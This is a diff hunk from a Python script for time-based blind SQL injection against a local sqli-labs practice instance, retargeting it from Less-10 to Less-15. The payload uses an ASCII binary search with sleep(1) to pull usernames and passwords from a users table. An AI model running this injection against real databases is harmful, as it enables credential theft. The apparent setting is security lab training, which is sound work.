@@ -16,7 +16,7 @@ def sql_bool():
         payload = "select group_concat(concat(username,'~',password)) from users"
         while low < high:
             mid = (low + high) // 2
-            url = f"http://127.0.0.1:8888/sqli-labs-master/Less-10/?id=1\" and if(ascii(substr(({payload}),{i},1))>{mid},sleep(1),0) --+ "
+            url = f"http://127.0.0.1:8888/sqli-labs-master/Less-15/?id=1\" and if(ascii(substr(({payload}),{i},1))>{mid},sleep(1),0) --+ "
 
             try:
                 res = requests.get(url=url, timeout=1)
